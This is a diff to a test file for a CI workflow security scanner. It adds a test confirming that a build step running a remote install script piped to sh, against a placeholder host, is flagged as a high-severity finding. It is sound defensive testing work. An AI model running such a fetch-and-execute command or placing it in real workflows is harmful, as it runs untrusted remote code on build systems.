@@ -35,3 +35,19 @@ def test_secret_pattern_generates_critical_finding():
     workflow = {"permissions": {"contents": "read"}, "jobs": {}}
     findings = scan_workflow(workflow, "api_key=ABCDEF1234567890")
     assert findings[0]["severity"] == "critical"
+
+
+def test_remote_script_piped_to_shell_is_detected():
+    workflow = {
+        "permissions": {"contents": "read"},
+        "jobs": {
+            "build": {
+                "steps": [
+                    {"name": "Unsafe install", "run": "curl https://example.invalid/install.sh | sh"}
+                ]
+            }
+        },
+    }
+    findings = scan_workflow(workflow)
+    assert any("remote script piped to shell" in finding["finding"] for finding in findings)
+    assert any(finding["severity"] == "high" for finding in findings)
